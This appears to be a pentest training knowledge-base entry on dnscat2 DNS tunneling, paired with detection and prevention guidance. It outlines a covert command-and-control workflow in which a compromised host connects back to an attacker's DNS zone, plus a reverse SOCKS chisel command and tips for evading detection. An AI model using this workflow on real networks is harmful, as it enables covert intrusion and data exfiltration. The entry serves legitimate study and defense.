name: Dnscat2 - DNS Tunneling
description: Tunnels a command-and-control channel entirely inside DNS queries/responses, useful when only DNS egress is allowed. Run the dnscat2 server on the attack host, then start the PowerShell client on the Windows target with the server's pre-shared secret.
source: CPTS Module 12: Pivoting, Tunneling, and Port Forwarding

examples.label: OSCP Ch19 — start dnscat2 server on Kali for a controlled DNS zone
OSCP Ch19 — start Linux dnscat2 client on compromised host
OSCP Ch19 — list active sessions and switch into session 1
OSCP Ch19 — dnscat2 port forward: tunnel local port to internal SMB (like ssh -L)
OSCP Ch19 — verify DNS resolution to your zone (test exfil path)
OSCP Ch19 — check pivot's DNS resolver points to your zone's nameserver

notes: On the server, use 'window -i 1' to interact with a session. Match the PreSharedSecret to the server's startup output. Also covered in: OSCP PEN-200 Chapter 19 (Tunneling Through Deep Packet Inspection). OSCP Ch19: DNS tunneling works when only DNS egress is allowed (common in restricted networks/DPI environments). Workflow: (1) control an authoritative DNS zone (your domain or dnsmasq on a reachable IP); (2) the victim's resolver must forward to your NS — verify with resolvectl status and nslookup tests; (3) dnscat2-server (standalone binary) is the Kali-side listener; (4) ./dnscat <domain> (compiled Linux client) on the pivot connects back; (5) once a session is up, 'listen <local_ip>:<port> <internal_ip>:<port>' creates an SSH -L style port forward over the DNS tunnel. Verify SOCKS port appeared on Kali with ss -ntplu before proxychains use.

defense.why_it_works: dnscat2 tunnels a command-and-control channel inside DNS queries/responses (encoded subdomains, TXT/NULL records), exfiltrating and controlling through a resolver even when only DNS egresses.
defense.prerequisites: A dnscat2 client on the target and DNS resolution that reaches the attacker's authoritative server (directly or recursively).
defense.impact: A covert C2/tunnel that works where only DNS is allowed out - control and data exfil past strict egress filtering.
defense.detection: [MITRE T1572] a high volume of DNS queries with long/encoded labels and unusual record types (TXT/NULL/CNAME) to one domain; high query entropy; a client resolving far more than baseline; DNS-tunneling signatures.
defense.artifacts: Anomalous DNS query volume/entropy to the attacker domain; the dnscat2 client process.
defense.prevention: [MITRE T1572 M1037 Filter Network Traffic] force internal clients through controlled resolvers and inspect DNS; [M1031] IDS/DNS-tunnel detection (entropy, volume, record-type analysis); block or sinkhole unknown authoritative domains.
defense.evasion: Low-and-slow queries, common record types, and a benign-looking domain reduce the tunneling signature; DNS-over-HTTPS further hides it.
defense.misconfiguration: The network lacks proper segmentation — a compromised DMZ host has direct layer-3 reachability to internal infrastructure (database servers, DCs, internal admin panels). No egress filtering blocks outbound HTTP/HTTPS connections to arbitrary hosts, allowing C2 channels and reverse tunnels. Internal firewalls only filter inbound traffic, not east-west or outbound.
defense.vulnerable_config:
# Network design: flat Layer-3 network, all VLANs can reach each other
# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)
# No egress proxy — direct outbound HTTP to any IP allowed

# iptables on pivot host (none blocking outbound):
iptables -L OUTPUT  # policy ACCEPT, no rules

# This allows: chisel client 10.10.10.5:8080 R:socks
# Attacker now has SOCKS5 access to the entire internal network
defense.secure_config:
# Network segmentation with explicit allow rules:
# DMZ -> Internet: only specific egress IPs (patch servers, DNS)
# DMZ -> Internal: ONLY the DB ports this specific app needs
# Internal -> Internal: segment by tier (web tier can't reach DC directly)

# Egress filtering — block all outbound except known-good:
# FortiGate / Palo Alto / iptables:
iptables -P OUTPUT DROP
iptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server
iptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns
# DNS monitoring — detect DNS tunneling (dnscat2) via unusual query frequency/length
# HTTP proxy with TLS inspection — detect reverse tunnels in HTTPS streams
